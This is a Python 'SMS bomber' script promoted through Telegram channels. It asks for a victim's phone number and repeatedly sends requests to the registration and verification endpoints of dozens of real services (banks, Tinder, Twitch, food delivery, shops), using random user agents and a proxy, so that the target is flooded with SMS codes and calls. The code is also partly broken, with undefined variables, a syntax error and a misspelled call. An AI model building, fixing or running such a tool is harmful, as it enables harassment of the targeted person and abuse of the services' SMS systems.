#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_info():
        _phoneNEW=phone[3:]
        _phone = phone
        _phone9 = _phone[1:]
        _phonePozichka = '+'+_phone[0:2]+'-'+_phone[2:5]+'-'+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12] #38-050-669-16-10'
        _phoneQ = '+'+_phone[0:2]+'('+_phone[2:5]+') '+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12] # +38(050) 669 16 10
        _phoneCitrus = '+'+_phone[0:3]+' '+_phone[3:5]+'-'+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12]
        _phoneComfy = '+'+_phone[0:2]+' ('+_phone[2:5]+') '+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12]
        _phone88 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+'-'+_phone[9:11]
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('''[blue]
 Telegram Channel - @Bomberukr
 Telegram - @Hironotori
''')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
os.system('termux-open-url https://t.me/Bomberukr')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('[red]Введите номер телефонa (без + ')

phone = console.input('[blue]Spavveri>>> ')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
run = int(console.input('[red]Введите количество повторов (1-10):\n[blue]Spavveri>>> '))
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
for _ in track(range(run)):
         headers = {"User-Agent": fake_useragent.UserAgent().random}
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers)
             print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] Не отправлено!')
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}, headers=headers)
             print('[@'+str(bot_username)+'] [+] Twitch отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] Не отправлено!')
         try:
             requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password}, headers=headers)
             print("[+] Регестрация на Citrus отправлена!")
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus}, headers=headers)
             print("[+] Citrus отправлено!")
         except:
             print("[-] не отправлено!")

         try:
             requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
             json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"}, headers=headers)
             print('[@'+str(bot_username)+'] [+] отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://www.moyo.ua/identity/registration",
             data={
                 "firstname": "Артем",
                 "phone": _phone,
                 "email": _email
             }
         , headers=headers)
             print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail}, headers=headers)
             print('[@'+str(bot_username)+'] [+] Comfy отправлено!')
         except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ}, headers=headers)
             print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut}, headers=headers)
             print('[@'+str(bot_username)+'] [+] Cinema5 отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://www.etm.ru/cat/runprog.html",
             data={
                 "m_phone": _phone,
                 "mode": "sendSms",
                 "syf_prog": "clients-services",
                 "getSysParam": "yes",
             }
         , headers=headers)
             print('[@'+str(bot_username)+'] [+] ETM отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://apteka.ru/_action/auth/getForm/",
             data={
                 "form[NAME]": "",
                 "form[PERSONAL_GENDER]": "",
                 "form[PERSONAL_BIRTHDAY]": "",
                 "form[EMAIL]": "",
                 "form[LOGIN]": _phone585,
                 "form[PASSWORD]": password,
                 "get-new-password": "Получите пароль по SMS",
                 "user_agreement": "on",
                 "personal_data_agreement": "on",
                 "formType": "simple",
                 "utc_offset": "120",
             },
         , headers=headers)
             print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, headers=headers)
             print('[@'+str(bot_username)+'] [+] отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone}, headers=headers)
             print('[@'+str(bot_username)+'] [+] Secunda отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,}, headers=headers)
             print('[@'+str(bot_username)+'] [+] rozamira-azs отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
             params={"number": _phone})
             print('[@'+str(bot_username)+'] [+] отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://api.iconjob.co/api/auth/verification_code",
             json={"phone": _phone})
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
             data={
                 "CB_NAME": "Артем",
                 "CB_PHONE": _phone88})
             print('[@'+str(bot_username)+'] [-] отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-]не отправлено!')

         try:
             requests.post("https://auth.pizza33.ua/ua/join/check/",
             params={
                 "callback": "angular.callbacks._1",
                 "email": _email,
                 "password": password,
                 "phone": _phone,
                 "utm_current_visit_started": 0,
                 "utm_first_visit": 0,
                 "utm_previous_visit": 0,
                 "utm_times_visited": 0,
             },
         )
             print('[@'+str(bot_username)+'] [+] отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] отправлено!')

         try:
             requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] отправлено!')
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://zoloto585.ru/api/bcard/reg/",
             json={
                 "name": "Максим",
                 "surname": "Летовал",
                 "patronymic": "Максимович",
                 "sex": "m",
                 "birthdate": "11.11.1999",
                 "phone": _phone585,
                 "email": email,
                 "city": "Москва",
             },
         )
             print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
             data={"phone": _phone585},
         )
             print('[@'+str(bot_username)+'] [+] Pliskov отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
             print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
             data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
         except:
             pass

         try:
             requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
             data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
         )
             print('[@'+str(bot_username)+'] [+] Sms4 отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://www.flipkart.com/api/5/user/otp/generate",
             headers={
                 "Origin": "https://www.flipkart.com",
                 "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
             },
             data={"loginId": "+" + _phone})
             print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://www.flipkart.com/api/6/user/signup/status",
             headers={
                 "Origin": "https://www.flipkart.com",
                 "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
             },
             json={"loginId": "+" + _phone, "supportAllStates": True})
             print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://bamper.by/registration/?step=1",
             data={
                 "phone": "+" + _phone,
                 "submit": "Запросить смс подтверждения",
                 "rules": "on",
             },
         )
             print('[@'+str(bot_username)+'] [+] Bamper отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
             data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
             print('[@'+str(bot_username)+'] [+] FriendClub отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
             data={"caller_number": _phone})
             print('[@'+str(bot_username)+'] [+] SalamPay отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
             json={
                 "phone": "+" + _phone,
                 "first_name": "-",
                 "utm_data": {},
                 "via": "call",
             })
             print('[@'+str(bot_username)+'] [+] звонок отправлен!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [+] не отправлен!')

         try:
             requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
             json={
                 "phone": "+" + _phone,
                 "first_name": "-",
                 "utm_data": {},
                 "via": "sms",
             },
         )
             print('[@'+str(bot_username)+'] [+] Uchi отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
             print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://shafa.ua/api/v3/graphiql', json={
                 "operationName": "RegistrationSendSms",
                 "variables": {"phoneNumber": "+" + _phone},
                 "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
             },
         )
             print('[@'+str(bot_username)+'] [+] Shafa отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
             headers={"Referer": "https://alpari.com/en/registration/"},
             json={
                 "client_type": "personal",
                 "email": _email,
                 "mobile_phone": _phone,
                 "deliveryOption": "sms",
             },
         )
             print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://uklon.com.ua/api/v1/account/code/send',
             headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
             json={"phone": _phone},
             )
             print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] е отправлено!')

         try:
             requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
             print('[@'+str(bot_username)+'] [+] GetMancar отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
             print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
             print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
             print('[@'+str(bot_username)+'] [+] Ubki отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
             print('[@'+str(bot_username)+'] [+] Top-Shop отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
             print('[@'+str(bot_username)+'] [+] Rendez-Vous отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
             print('[@'+str(bot_username)+'] [+] Osova отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправено!')

         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
             json={"phone_number": "+" + _phone})

             print('[@'+str(bot_username)+'] [+] Yandex.Eda отправлено!')
             time.leep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://izi.ua/api/auth/register",
             json={
                 "phone": "+" + _phone,
                 "name": "Анастасия",
                 "is_terms_accepted": True,
             },
         )
             print('[@'+str(bot_username)+'] [+] Izi отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
             print('[@'+str(bot_username)+'] [+] Izzi отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
             print('[@'+str(bot_username)+'] [+] Pozichka отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
             print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] Suandshi отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
             print('[@'+str(bot_username)+'] [+] Makarolls отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
             print('[@'+str(bot_username)+'] [+] PanPizza отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
             print('[@'+str(bot_username)+'] [+] MOYO отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
             print('[@'+str(bot_username)+'] [+] BelkaCar sent!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] error in sent!')

         try:
             requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
             print('[@'+str(bot_username)+'] [+] StarPizzaCafe отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
             print('[@'+str(bot_username)+'] [+] Tinder sent!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] error in sent!')

         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             print('[@'+str(bot_username)+'] [+] Karusel sent!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] error in sent!')

         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
             print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] error in sent!')

         try:
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] Dostavista отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
             print('[@'+str(bot_username)+'] [+] MonoBank отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
             print('[@'+str(bot_username)+'] [+] SportMaster отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] Alfalife отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] KoronaPay отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
             print('[@'+str(bot_username)+'] [+] BTfair отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
             print('[@'+str(bot_username)+'] [+] GGbet отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-]  не отправлено!')

         try:
             requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
             print('[@'+str(bot_username)+'] [+] ETM отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
             print('[@'+str(bot_username)+'] [+] TheLive отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             print('[@'+str(bot_username)+'] [+] MTS sent!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] error in sent!')

         try:
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] MyGames sent!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [+] error in sent!')

         try:
             requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
             print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
             print('[@'+str(bot_username)+'] [+] Kasta отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] Kasta Не отправлено!')

         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
             print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
             print('[@'+str(bot_username)+'] [+] Creditter отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
             print('[@'+str(bot_username)+'] [+] Ingos отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
             print('[@'+str(bot_username)+'] [+] Admiralxxx отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
             print('[@'+str(bot_username)+'] [+] Av отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
             print('[@'+str(bot_username)+'] [+] MTS отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
             print('[@'+str(bot_username)+'] [+] City24 отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] SushiMaster отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
             print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
             print('[@'+str(bot_username)+'] [+] Niyama отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] Niyama не отправлено!')

         try:
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
             print('[@'+str(bot_username)+'] [+] VSK отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] VSK не отправлено!')

         try:
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
             print('[@'+str(bot_username)+'] [+] EasyPay отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
             print('[@'+str(bot_username)+'] [+] Fix-Price отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

         try:
             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
             print('[@'+str(bot_username)+'] [+] NovaLinia отправлено!')
             time.sleep(0.1)
         except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')
